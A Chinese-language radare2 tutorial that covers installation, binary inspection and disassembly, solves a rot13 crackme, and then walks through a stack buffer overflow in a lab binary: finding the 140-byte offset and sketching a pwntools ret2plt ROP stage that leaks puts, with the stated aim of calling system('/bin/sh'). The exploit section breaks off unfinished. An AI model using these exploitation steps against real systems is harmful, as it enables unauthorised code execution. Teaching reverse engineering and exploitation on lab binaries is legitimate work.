# Radare2

一款免费/自由的工具链，用于简化多种低级别任务，例如电子取证、软件逆向、渗透、调试等等。它由一组库（可扩展）和程序组成，几乎可以用于各种编程语言。

Radare2 在CTF或逆向分析过程中是非常有用的。但是只有少部分人了解radare2，也许是因为很多人不喜欢放弃已经熟悉的工具，例如：IDA Pro, x64dbg, Ghidra, OllyDBG, gdb等等。但是radare2是非常有必要列入自己工具集的。

主要功能特性：
- Batch, commandline, visual and panels interactive modes
- Embedded webserver with js scripting and webui
- Assemble and disassemble a large list of CPUs
- Runs on Windows and any other UNIX flavour out there
- Analyze and emulate code with ESIL
- Native debugger and GDB, WINDBG, QNX and FRIDA
- Navigate ascii-art control flow graphs
- Ability to patch binaries, modify code or data
- Search for patterns, magic headers, function signatures
- Easy to extend and modify
- Commandline, C API, script with r2pipe in any language


## 安装、升级、卸载
推荐从github获取安装最新版本

```
$ git clone https://github.com/radareorg/radare2
$ cd radare2 ; sys/install.sh
```

更新r2也可以使用上述命令。


如果安装中遇到问题，可以尝试下面的指令
```
$ sudo make purge
$ rm -rf shlr/capstone
$ git clean -xdf
$ git reset --hard @~50
$ sys/install.sh
```

如果要卸载，可以使用下列命令：
```
make uninstall
make purge
```

## 基本用例

Radare2 可以用于多种用途，可以从命令行、shell脚本调用独立的工具。

为了快速了解R2提供的各种命令，最简单的方法是从学习如何使用其帮助系统开始。在已安装r2的系统中的命令行中键入命令：`r2 -h`。可以看到命令行中出现的各种提示，例如：
```
Usage: r2 [-ACdfLMnNqStuvwzX] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]
          [-s addr] [-B baddr] [-m maddr] [-c cmd] [-e k=v] file|pid|-|--|=
 -            same as 'r2 malloc://512'
 -a [arch]    set asm.arch
 -A           run 'aaa' command to analyze all referenced code
 -b [bits]    set asm.bits
 -B [baddr]   set base address for PIE binaries
 -c 'cmd..'   execute radare command
 -d           debug the executable 'file' or running process 'pid'
 -i [file]    run script file
 -k [OS/kern] set asm.os (linux, macos, w32, netbsd, ...)
 -l [lib]     load plugin file
 -p [prj]     use project, list if no arg, load if no file
 -w           open file in write mode
```

### 获取基本信息

当我们面对一些逆向工作时（我把他们成为challenges），首先要考虑这个二进制文件（或片段）的基本信息。

执行命令`rabin2 -I <二进制文件名>`

这个命令将提取如ELF、PE、Mach-O、Java-Class等二进制中的信息，包括：
- Sections
- Headers
- Imports
- Strings
- Entrypoints
- ...

命令可以多种格式输出。

例如，使用 -I 参数打印os、语言、endianness、架构、mitigations（canary，pic，nx）等等：

```
$ rabin2 -I megabeets_0x1
arch     x86
baddr    0x8048000
binsz    6220
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

上面的输出可以很清楚的看出，二进制文件 megabeets_0x1 是一个32位的 ELF 文件，not stripped and dynamically linked。
它没有使用什么安全机制。

### 运行二进制文件
**注意：运行一个二进制文件可能会危害你的系统。**

首先，我们尝试直接运行一个二进制文件：

```bash
$ ./megabeets_0x1
 
  .:: Megabeets ::.
Think you can make it?
Nop, Wrong argument.
 
$ ./megabeets_0x1 abcdef
 
  .:: Megabeets ::.
Think you can make it?
Nop, Wrong argument.

```

上面的输出显示这个程序打印了“Nop, Wrong argument".之后，我们猜测需要提供给函数一个参数才能运行，我们键入abcdef作为参数。但仍然失败了。那么这个challenge可能需要破解参数/口令才能完成。

让我们使用radare2来运行它：
```bash
$ r2 megabeets_0x1
 -- Thank you for using radare2. Have a nice night!
[0x08048370]>
```

上面显示了一段欢迎词，并且给出了等待接收用户命令的提示符，以及当前r2跟踪到的地址`[0x08048370]`。默认地，R2会自动跟踪到这个二进制文件的入口点地址（entrypoint），可以用下列`ie`命令(查找入口点)检查是否正确：

```bash
[0x08048370]> ie
[Entrypoints]
vaddr=0x08048370 paddr=0x00000370 haddr=0x00000018 hvaddr=0x08048018 type=program 1 entrypoints

```

### 分析

默认情况下，radare2不分析文件，因为分析可能是非常复杂的过程，需要很长的时间。radare2能提供的分析功能很多，需要手动去执行。这些命令通常以`a`开头。

```bash
0x08048370]> a?
Usage: a  [abdefFghoprxstc] [...]
| a                  alias for aai - analysis information
| a*                 same as afl*;ah*;ax*
| aa[?]              analyze all (fcns + bbs) (aa0 to avoid sub renaming)
| a8 [hexpairs]      analyze bytes
| ab[b] [addr]       analyze block at given address
| abb [len]          analyze N basic blocks in [len] (section.size by default)
| ac[?]              manage classes
| aC[?]              analyze function call
| aCe[?]             same as aC, but uses esil with abte to emulate the function
| ad[?]              analyze data trampoline (wip)
| ad [from] [to]     analyze data pointers to (from-to)
| ae[?] [expr]       analyze opcode eval expression (see ao)
| af[?]              analyze Functions
| aF                 same as above, but using anal.depth=1
| ag[?] [options]    draw graphs in various formats
| ah[?]              analysis hints (force opcode size, ...)
| ai [addr]          address information (show perms, stack, heap, ...)
| aj                 same as a* but in json (aflj)
| aL                 list all asm/anal plugins (e asm.arch=?)
| an [name] [@addr]  show/rename/create whatever flag/function is used at addr
| ao[?] [len]        analyze Opcodes (or emulate it)
| aO[?] [len]        Analyze N instructions in M bytes
| ap                 find prelude for current offset
| ar[?]              like 'dr' but for the esil vm. (registers)
| as[?] [num]        analyze syscall using dbg.reg
| av[?] [.]          show vtables
| ax[?]              manage refs/xrefs (see also afx?)
```

最常用的分析命令是：`aa` 和 `aaa` ，如果想一开始就启动分析，可以使用`r2 -A megabeets_0x1`。

```bash
[0x08048370]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

### Flags

经过分析，radare2 会将一些地址偏移与一些命名关联，例如 Sections，Function，Symbols，Strings。这些命名都称为 flags 。Flags 可以被分组到 flag spaces 中。一个 flag space 是一组相近特征或类型的 flags 的命名空间。

打印查看flag spaces可以使用命令 `fs`:
```bash
[0x08048370]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
...


```

我们可以使用 `fs <flagspace>`选择一个flag space；若要打印该flags到标准输出，可以使用`f`。例如：
```bash
[0x08048370]> fs imports; f
0x00000000 16 loc.imp.__gmon_start
0x08048320 6 sym.imp.strcmp
0x08048330 6 sym.imp.strcpy
0x08048340 6 sym.imp.puts
0x08048350 6 sym.imp.__libc_start_main
```

上面的输出可以看到在 imports 这个flag space中的所有flag，以及对应的地址。类似的命令还包括：打出所有的strings `fs strings; f`。

```
[0x08048370]> fs strings 
[0x08048370]> f
0x08048700 21 str..::_Megabeets_::.
0x08048715 23 str.Think_you_can_make_it
0x0804872c 10 str.Success
0x08048736 22 str.Nop__Wrong_argument.
```

### strings

Radare2 会将字符串、变量名的偏移位置打上 flags。有几种方法可以查看：

- `iz`，列出数据段的字符串；
- `izz`，列出二进制文件中所有的字符串。

```
[0x08048370]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000700 0x08048700 20  21   .rodata ascii \n  .:: Megabeets ::.
1   0x00000715 0x08048715 22  23   .rodata ascii Think you can make it?
2   0x0000072c 0x0804872c 9   10   .rodata ascii Success!\n
3   0x00000736 0x08048736 21  22   .rodata ascii Nop, Wrong argument.\n

```

假如我们对使用"Success"字符串感兴趣，我们可以查看他们在什么位置被引用：

```bash
[0x08048370]> axt @@ str.*
main 0x8048609 [DATA] push str..::_Megabeets_::.
main 0x8048619 [DATA] push str.Think_you_can_make_it
main 0x8048646 [DATA] push str.Success
main 0x8048658 [DATA] push str.Nop__Wrong_argument.

```

说明：
- `axt` 命令用于分析 x-refs to。
- 运算符 `@@` 类似一种循环变量，用于在某个偏移列表上重复执行一个命令
- `str.*` 是一个对所有以str.为开头的字符串的通配符。

上述命令不仅列出了strings flags 还列出了引用这些字符串的函数名。当然，在使用上述命令前需要确保选择这个strings flag space ，默认使用`fs *` 。

### 搜索定位 seeking

在打开二进制文件后，我们会停在入口点。如果需要改变便宜位置，可以使用s？命令。

```bash
[0x08048370]> s?
Usage: s    # Help for the seek commands. See ?$? to see all variables
| s                 Print current address
| s.hexoff          Seek honoring a base from core->offset
| s:pad             Print current address with N padded zeros (defaults to 8)
| s addr            Seek to address
| s-                Undo seek
| s-*               Reset undo seek history
| s- n              Seek n bytes backward
| s--[n]            Seek blocksize bytes backward (/=n)
| s+                Redo seek
| s+ n              Seek n bytes forward
| s++[n]            Seek blocksize bytes forward (/=n)
| s[j*=!]           List undo seek history (JSON, =list, *r2, !=names, s==)
| s/ DATA           Search for next occurrence of 'DATA'
| s/x 9091          Search for next occurrence of \x90\x91
| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr
| sb                Seek aligned to bb start
| sC[?] string      Seek to comment matching given string
| sf                Seek to next function (f->addr+f->size)
| sf function       Seek to address of specified function
| sf.               Seek to the beginning of current function
| sg/sG             Seek begin (sg) or end (sG) of section or file
| sl[?] [+-]line    Seek to line
| sn/sp ([nkey])    Seek to next/prev location, as specified by scr.nkey
| so [N]            Seek to N next opcode(s)
| sr pc             Seek to register
| ss                Seek silently (without adding an entry to the seek history)

```

基本上 seek 命令使用一个地址或数学表达式作为参数，表达式可以是数学运算符、flag或内存访问符。假设我们寻找 main function，可以执行`s main`,但是，我们通常会先使用 `afl` 命令列出有哪些函数 flags。

```
[0x08048370]> afl
0x08048370    1 33           entry0
0x08048350    1 6            sym.imp.__libc_start_main
0x080483b0    4 43           sym.deregister_tm_clones
0x080483e0    4 53           sym.register_tm_clones
0x08048420    3 30           sym.__do_global_dtors_aux
0x08048440    4 43   -> 40   entry.init0
0x080486e0    1 2            sym.__libc_csu_fini
0x080483a0    1 4            sym.__x86.get_pc_thunk.bx
0x0804846b   19 282          sym.rot13
0x080486e4    1 20           sym._fini
0x08048585    1 112          sym.beet
0x08048330    1 6            sym.imp.strcpy
0x08048320    1 6            sym.imp.strcmp
0x08048680    4 93           sym.__libc_csu_init
0x080485f5    5 127          main
0x080482ec    3 35           sym._init
0x08048340    1 6            sym.imp.puts

```

我们可以看到上面的一些 imports，.ctors , entrypoints，libc，main和两个令人感兴趣的函数：sym.beet 和 sym.rot13。

### 反汇编 Disassembling

#### main function

使用`s main`定位到main函数入口，然后用`pdf`反汇编这个函数。注意地址的改变。

注意：使用现代OS时，若要终端显示utf-8，执行`e scr.utf8=true` 和 `e scr.utf8.curvy=true` ，这能够使输出更好看一些。或者在配置文件`~/.radare2rc`中永久设置。

```bash
[0x08048370]> s main
[0x080485f5]> pdf
            ; DATA XREF from entry0 @ 0x8048387
  int main (int32_t arg_4h);
       ; var int32_t var_8h @ ebp-0x8
       ; arg int32_t arg_4h @ esp+0x24
       0x080485f5      8d4c2404       lea ecx, [arg_4h]
       0x080485f9      83e4f0         and esp, 0xfffffff0
       0x080485fc      ff71fc         push dword [ecx - 4]
       0x080485ff      55             push ebp
       0x08048600      89e5           mov ebp, esp
       0x08048602      53             push ebx
       0x08048603      51             push ecx
       0x08048604      89cb           mov ebx, ecx
       0x08048606      83ec0c         sub esp, 0xc
       0x08048609      6800870408     push str..::_Megabeets_::.  ; "\n  .:: Megabeets ::." ; const char *s
       0x0804860e      e82dfdffff     call sym.imp.puts           ; int puts(const char *s)
       0x08048613      83c410         add esp, 0x10
       0x08048616      83ec0c         sub esp, 0xc
       0x08048619      6815870408     push str.Think_you_can_make_it  ; "Think you can make it?" ; const char *s
       0x0804861e      e81dfdffff     call sym.imp.puts     ; int puts(const char *s)
       0x08048623      83c410         add esp, 0x10
       0x08048626      833b01         cmp dword [ebx], 1
   ╭─< 0x08048629      7e2a           jle 0x8048655
   │   0x0804862b      8b4304         mov eax, dword [ebx + 4]
   │   0x0804862e      83c004         add eax, 4
   │   0x08048631      8b00           mov eax, dword [eax]
   │   0x08048633      83ec0c         sub esp, 0xc
   │   0x08048636      50             push eax
   │   0x08048637      e849ffffff     call sym.beet
   │   0x0804863c      83c410         add esp, 0x10
   │   0x0804863f      85c0           test eax, eax
  ╭──< 0x08048641      7412           je 0x8048655
  ││   0x08048643      83ec0c         sub esp, 0xc
  ││   0x08048646      682c870408     push str.Success       ; "Success!\n" ; const char *s
  ││   0x0804864b      e8f0fcffff     call sym.imp.puts      ; int puts(const char *s)
  ││   0x08048650      83c410         add esp, 0x10
 ╭───< 0x08048653      eb10           jmp 0x8048665
 │││   ; CODE XREFS from main @ 0x8048629, 0x8048641
 │╰╰─> 0x08048655      83ec0c         sub esp, 0xc
 │     0x08048658      6836870408     push str.Nop__Wrong_argument. ; "Nop, Wrong argument.\n" ; const char *s
 │     0x0804865d      e8defcffff     call sym.imp.puts      ; int puts(const char *s)
 │     0x08048662      83c410         add esp, 0x10
 │     ; CODE XREF from main @ 0x8048653
 ╰───> 0x08048665      b800000000     mov eax, 0
       0x0804866a      8d65f8         lea esp, [var_8h]
       0x0804866d      59             pop ecx
       0x0804866e      5b             pop ebx
       0x0804866f      5d             pop ebp
       0x08048670      8d61fc         lea esp, [ecx - 4]
       0x08048673      c3             re 
```

读上面的汇编代码，我们可以将其简化为一段伪代码：
```c
//f any argument passed to the program AND the result of beet, given the passed argument, is true
// argc is the number of arguments passed to the program
// argc will be at least 1 becuase the first argument is the program name
// argv is the array of parameters passed to the program
if (argc > 1 && beet(argv[1]) == true) 
{
    print "success"
} else { 
     print "fail"
} 
exit
```

#### 可视化模式或图形模式

Radare2 有比较强的可视化模式，对用户更友好。使用 `V` 命令启动可视化模式屏幕。

使用`p/P`命令可以切换模式，在屏幕顶端时当前指令。按`q`可以退出可视化模式。

一些可用的命令：
- `x/X` 列出当前偏移 refs-to /from 
- `: command` 在可视化模式下执行r2 命令，类似于vim
- `;comment` 加回车，可以在某个偏移后加入注释，或者使用`;-`删除注释；使用`;!`使用默认的文本编辑器编辑注释。
- `m<key>` 可以使用一个自己选择的key来标记特别偏移，按`'<key>`跳转到你的key，这有助于快速导航到这个位置。
- `q` 退出返回r2 shell。

#### 可视化图

Radare2 有一个图模式。使用`VV`进入可视化图模式，按上下作用键可以查看全景。

使用`g`和key可以快速跳到key指定的函数。

#### 反汇编 ‘beet'

了解基本的使用后，我们来看一下反汇编beet的情况。上面已经知道beet函数负责处理传递到程序的参数，我们打印beet可以有多种方法：

- seek to beet，可以使用`s sym.beet`。可以使用 `f sym.+TAB` 查看函数。
- 使用`pdf @ sym.beet` 打印 beet。 `@` 用作temporary seeking.
- 从可视模式下，从main 跳转到beet 可以按 2
- 从可视模式下，从main 跳转到beet 可以按 oc

从汇编代码中可以找到命令行传入的参数放在ebp-local_88h，如果要显示0x88的不同进制下的值，可以使用`? 0x88`

在可视模式下执行r2命令，需要先键入`:`.


```bash
:> ? 0x88
int32   136
uint32  136
hex     0x88
octal   0210
unit    136
segment 0000:0088
string  "\x88"
fvalue: 136.0
float:  0.000000f
double: 0.000000
binary  0b10001000
trits   0t12001
```

当前 stack 中的 buffer 占用 128字节，下4个字节存放ebp指针（指向上一个stack frame），再下4个字节存放返回地址，总共是136个字节。


在缓冲区被给定参数填充后，然后将其与名为 的函数的结果进行比较sym.rot13。 Rot-13是一种著名的替换密码，在 CTF 和 Crackmes 中大量使用。该函数使用 9 个十六进制值调用，这些值看起来像是雷达为我们识别的。在反汇编的注释中，我们可以看到“Mega”、“beet”和“s”，它们共同构成了字符串“Megabeets”。

二进制文件对“Megabeets”执行 rot13，然后将结果与我们使用传递的参数进行比较strcmp。幸运的是，我们不需要努力工作，因为 r2 框架已经在其实用程序中包含了 rot13 密码工具rahash2 。

rahash2使用各类hash方法计算文件或字符串的校验和。

```bash
[ 0x08048585 ]> !rahash2 -E rot -S s: 13 -s "Megabeets\n"
Zrtnorrgf

```

rahash2 执行了 rot13(“Megabeets”)，结果是“Zrtnorrgf”。通过使用`!` ，我们可以在 r2 shell 中执行 shell 命令，如 system(3). 我们可以假设“Zrtnorrgf”与我们的输入进行比较。`ood` 命令可以把“Zrtnorrgf”作为参数，以调试模式打开二进制文件，ood?看看我们会得到什么。

```bash
[0x08048585]> ood?
Usage: ood   # Debug (re)open commands
| ood [args]      # reopen in debug mode (with args)
| oodf [file]     # reopen in debug mode using the given file
| oodr [rarun2]   # same as dor ..;ood
 
[0x08048585]> ood Zrtnorrgf
Process with PID 26850 started...
= attach 26850 26850
File dbg:///home/beet/megabeets/crackmes/megabeets_0x1  Zrtnorrgf reopened in read-write mode
26850
```

上面的命令是使用r2 debugger打开 megabeets_0x1 并传入参数。然后使用`dc`继续执行：

```bash
[0xf7f4a120]> dc
  .:: Megabeets ::.
Think you can make it?
Success!
```

可见，我们得到了希望看到的success。


## 进阶使用——渗透二进制

Radare2 有很多利于渗透二进制的功能：安全机制检查、RPO gadget searching、random patterns generation、register telescoping等等。

下面的例子显示了在一个 ASLR enabled system 中绕过 nx 保护的二进制。[例子文件](https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2)和[例子源码](https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c)


使用下列命令可以编译源码：
```bash
$gcc -m32 -fno-stack-protector -no-pie megabeets_0x2.c -o megabeets_0x2 
```
这个例子和基本用例中的很像，但main函数中有所不同。

- 编译过程中不使用`-z execstac` ,启动了 NX bit
- 使用scanf接收用户输入，而不是使用参数传入。
- 使用puts 打印到屏幕
- 程序输出字符的些许不同

先前的main：

```c
int main(int argc, char *argv[])
{
    printf("\n  .:: Megabeets ::.\n");
    printf("Think you can make it?\n");
    if (argc >= 2 && beet(argv[1]))
    {
        printf("Success!\n\n");
    }
    else
        printf("Nop, Wrong argument.\n\n");

    return 0;
}
```

现在的main：
```c
int main(int argc, char *argv[])
{
    char *input; 
    puts("\n  .:: Megabeets ::.\n");
    puts("Show me what you got:");
    
    scanf("%ms", &input);
    if (beet(input))
    {
        printf("Success!\n\n");
    }
    else
        puts("Nop, Wrong argument.\n\n");

    return 0;
}
```

该二进制文件的功能十分简单，首先询问用户输入，然后对输入字符串执行 rot13 并与字符串"Zrtnorrgf"相比较。

```bash
$ ./megabeets_0x2 

  .:: Megabeets ::.

Show me what you got:
blablablabla
Nop, Wrong argument.

$ ./megabeets_0x2 

  .:: Megabeets ::.

Show me what you got:
Zrtnorrgf
Success!

```

### 理解这个漏洞

对于每一个渗透挑战，对其做安全机制检查是一个好习惯。
例如使用rabin2 来显示各种基本信息。


```bash
$ rabin2 -I megabeets_0x2

arch     x86
binsz    6072
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
NX  表示不可在堆栈中执行代码。此外，这个文件没有使用 canaries，pic，relro进行保护。
  
现在，我们快速查看一下这个程序的执行过程，我们使用下面命名进入调试模式：

```bash
$ r2 -d megabeets_0x2
Process with PID 20859 started…
= attach 20859 20859
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32– Your endian swaps
[0xf7782b30]> aas
```
- -d 表示调试模式
- aas 表示分析函数，符号等等。
- aaa 命令不总是推荐，因为这个分析过程非常复杂。

下面我们执行到main函数入口处。
```bash
[0xf7797b30]> dcu?
|Usage: dcu Continue until address
| dcu address      Continue until address
| dcu [..tail]     Continue until the range
| dcu [from] [to]  Continue until the range

[0xf7797b30]> dcu main
Continue until 0x08048658 using 1 bpsize
hit breakpoint at: 8048658
```

- `dcu` 表示执行到某个地址。

接下来使用`VV`，我们进入可视化模式。

可以看到，用户输入【arg_8h】被拷贝到一个buffer【local_88h】,然后我们看到了字符串 Megabeets 被使用rot13加密，然后将结果与输入比较。

能看出来什么问题么？

输入的size从来没有被检查过。意味着键入的输入可以很大，大于buffer的size后，可能引起缓冲区溢出。这就是一个漏洞。

### 构造exploit

发现了漏洞点，我们可以构造一个payload来利用漏洞。我们的目标就是得到system shell。首先，需要验证是否真的存在漏洞函数，然后找到我们的payload覆盖的stack。

我们使用一个radare2提供的工具 `ragg2` ,他能够生成一个名为[ De Bruijin Sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence)的循环模式，并检查我们的payload覆盖buffer的具体偏移。

```bash
$ ragg2 -
<truncated>
 -P [size]       prepend debruijn pattern
<truncated>
 -r              show raw bytes instead of hexpairs
<truncated>

$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh

```

`rarun2` 用作启动程序，可运行不同环境、参数、权限、目录和覆盖默认文件描述符的程序。当您必须使用长参数运行程序、将大量数据传递给 stdin 或诸如此类的东西时，它非常有用，这通常是利用二进制文件的情况。

我们需要做以下几步：
- 1.使用 ragg2 写一个 DeBruijin 模式的内容到文件
- 2.生成 rarun2 profile 文件并设定输出文件为 stdin
- 3.使用 radare2 做分析，发现偏移。

```bash
$ ragg2 -P 200 -r > pattern.txt
$ cat pattern.txt
AAABAACAADAAEAAFAAGAAHAAI… <truncated> …7AA8AA9AA0ABBABCABDABEABFA
 
$ vim profile.rr2
 
$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt
 
$ r2 -r profile.rr2 -d megabeets_0x2
Process with PID 21663 started…
= attach 21663 21663
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
 
— Use rarun2 to launch your programs with a predefined environment.
[0xf77c2b30]> dc
Selecting and continuing: 21663
 
.:: Megabeets ::.
 
Show me what you got?
child stopped with signal 11
 
[0x41417641]>
```

上面的例子显示了我们通过rarun2传递 pattern.txt 给标准输入，并执行二进制文件，最后收到 SIGSEV 11。这个信号是一个一步通知，发送给进程或相同进程中特定线程，以通知他某个事件发生了。 表示无效的虚地址引用或段错误，例如执行了一个段违规。

注意到当前地址了么？`0x41417641` ，这个无效地址表达了 `AvAA` (ASCII little-endian) ，一个我们payload中的片段。radare允许我们找到一个DeBruijin模式中给定值的offset。

```
[0x41417641]> wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’
| wopO value         Finds the given value into a De Bruijn Pattern at current offset
[0x41417641]> wopO `dr eip`
140
```
现在，我们知道了覆盖返回地址的payload字节在140字节之后，我们可以开始构建自己的payload了。

### 生成exploit

我们的目标是获得shell。有许多种方法可以实现，特别是对于上面例子中有漏洞的代码。为了理解我们可以做什么，我们首先需要理解我们不能做什么。
- 我们的机器被ASLR机制保护，所以不能预测libc的内存地址，所以不容易实现ret2libc。
- 我们的二进制文件被NX所保护，意味着堆栈不可执行，所以不能将shellcode放在stack中跳转执行。

尽管这些保护阻止我们使用一些渗透技术，但我们还是可以绕过他们。

为了汇编我们的exploit，我们需要仔细的看一下这些库和函数。

以调试模式打开二进制文件，查看使用的库和函数。

```bash
$ r2 -d megabeets_0x2
Process with PID 23072 started…
= attach 23072 23072
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
— You haxor! Me jane?
[0xf7763b30]> il
[Linked libraries]
libc.so.61 library
```

- `il` 显示了当前二进制所用的库和版本。

- `ii` 显示所有imports
- `iiq` 进现实imports 不显示详细细节

我们看到puts和scanf，这两个函数可以帮助我们构建exploit。我们将尝试执行一个system("/bin/sh") 弹出一个shell。

### 计划
- leak puts的物理地址
- 计算libc的基地址
- 计算system的地址
- 找到libc中包含string /bing/sh 的地址
- 使用/bin/sh调用system

### leaking puts的地址

为了查找利用 puts的地址，我们使用一种叫做ret2plt的技术。 Procedure Linkage Table 是一种内存结构，包含了一个存放链接时不能确定物理地址的函数的代码stub。我们在 .text 段找到的 CALL 指令，不直接调用函数，而是在PLT中调用这个stub code，所谓 func_name@plt。

这个stub被调用后会跳转到全局偏移表（GOT）中函数所列的地址。假如是第一次调用这个函数，那么 GOT entry 将指回到 PLT，按顺序将调用一个动态链接，这个链接会解析所希望调用的函数的真实地址。接下来 func_name@plt 被调用，stub 直接获取GOT中的该函数地址。


为了实现上面的分析，我们将查找PLT中和GOT中的puts地址，然后以 puts@got为参数调用 puts@plt 。我们将链式调用和发送他们到程序中scanf的地方（希望接受用户输入的地方）。然后我们将返回entrypoint 作第二阶段的exploit。将发生的是，puts将打印它自己的物理地址！！！

为了写exploit ，我们下载pwnlib框架，这是个非常好的渗透工具。简化了很大工作。

安装 `pip3 install pwntools`

下面是我们第一阶段的python骨架：

```python
from pwn import *

# Addresses
puts_plt =
puts_got =
entry_point =

# context.log_level = "debug"

def main():
    
    # open process
    p = process("./megabeets_0x2")

    # Stage 1
    
    # Initial payload
    payload  =  "A"*140 # padding
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info("puts is at: 0x%x" % leak)
    p.clean()
  

if __name__ == "__main__":
    main()
```

我们需要填入 puts_plt 、puts_got 、entry_point 的地址。回到radare2 执行下列命令。
- `#` 字符用于加注注释
- `~` 字符用于radare的内部grep

```bash

```

## 

```shell
$ rasm2 -a arm -b 32 -d `rasm2 -a arm -b 32 nop`
$ rabin2 -Ss /bin/ls  # list symbols and sections
$ rahash2 -a md5 /bin/ls
$ rafind2 -x deadbeef bin
$ ragg2
```





所有程序也可以指令形式在r2中被调用：
```
$ r2 -
> pa nop
90
> pad 90
nop
```

一些日常使用的通用命令如下：
```shell
$ r2 /bin/ls
> aaa    # analyze all the things
> is     # list symbols
> afl    # list functions found
> pdf    # disassemble function
> s <tab># seek to address
> v      # enter visual panels mode
```

### Debugger

通过 `r2` 打开的文件时，给定文件的URI所选定的IO层可以是任何形式，从本地文件、远程r2 shell、整个磁盘、其他进程的内存都可以。

为简化操作，标志 `-d` 用于 `dbg://` 这个uri来连接到一个进程读取它的内存镜像，改变寄存器和检查执行流。他是一个低级别的调试器，但不是替代 gdb或lldb。

```shell
$ r2 -d gdb://127.0.0.1
> ds          # step into
> dso         # step over
> dr=         # show registers in columns
> dbt         # show backtrace
> dsu entry0  # continue until entrypoint
> dr rax=33   # change value of register
> pxr@rsp     # inspect stack
> drr         # periscoped register values
```

### 插件

使用集成的包管理器你可以简化安装插件工作，最有趣的一点是原生 ghidra 反编译器、r2dec 反编译器和 frida 的集成。其他还有许多。

```shell
$ r2pm update
$ r2pm -i r2ghidra r2dec r2frida
```

### Frida

Frida 是非常流行的 in-process 调试跟踪工具。通过安装r2frida插件，它也可以在 r2 中使用。通过usb，tcp和别的读写进程内存，你可以附着或布设到一个本地或远程进程中。

代替使用frida，使用r2frida的一个主要优势是：尽管不依赖于python，你可以使用短命令，而不是键入多行的js代码。

- Access remote filesystems
- Modify filedescriptors
- Breakpoints (Like in DWARF)
- Load/Unload agent scripts as plugins
- Sybolicate from local bins, scripts or runtime info
- Supports macOS/iOS/Linux/Android/QNX/Windows

```shell
$ r2 frida:///bin/ls
> \dc         # continue the execution
> \dd         # list file descriptors
> \dm         # show process memory maps
> \dmm        # show modules mapped
> \dl foo.so  # load a shlib
> \dt write   # trace every call to 'write'
> \isa read   # find where's the read symbol located
> \ii         # list imports off the current module
> \dxc exit 0 # call 'exit' symbol with argument 0
```

### 文档

可以在 `r2` 中使用 `?` 来查询radare2的使用文档。

You can use the HUD mode to interactively browse all the commands inside r2 using this oneliner:


`r2 -Qc'?*~...' --`

### 常用命令
- `r2 <some-bin-file-name>`  

#### 基本信息
- `-iI` 分析文件基本情况(文件格式、指令架构)
- `-ii` 分析导入表
- `-iE` 分析导出表
- `-it` 计算文件哈希值

#### 文件分析
- `aaa` 分析程序中所有函数，分析前 radare2 识别不了函数，分析后就可以正常打印函数代码了（pdf 打印函数代码）
- `aa` 命令只分析主函数
- `afl` 列出文件中的函数
- `axt <function-name>`  列出指定函数的交叉引用情况。
- `afx` 查看调用函数


注意：交叉引用等需要先执行aaa或aa分析命令。

#### 定位

- `s function` 跳转到函数名指定的位置/地址。

#### GUI
- `VV` 进入图形化模式，使用 h j k l 进行上下移动，使用p/P切换图形模式，使用空格切换文本、图形模式。文本下可以使用 p 切换模式，小写的 vv 可以用来粗略浏览函数信息。

#### 查看代码
- `pdf` 查看函数汇编代码
- `pd x` 打印汇编信息x条
- `pdc` 反汇编函数
- `px` 打印16进制数，默认从当前位置开始，参数控制打印的字节数。
#### 改写指令
- `"wa xxx"` 修改汇编指令为 xxx

#### 调试
- `r2 -d 目标文件` 进入调试模式，输入 `!`在调试时可以看到感叹号
- `r2 -d 目标pid` attach 某个process 进入调试模式，输入 `!`在调试时可以看到感叹号
- `r2 -d -A 目标文件` 加载二进制文件并启动分析。
- 

- `db <function-name>` 在某个地址设置断点
- `dbi` 查看所有断点
- `dc` 运行二进制文件
- `dbt` 查看对战
- `drr` 转储寄存器内容
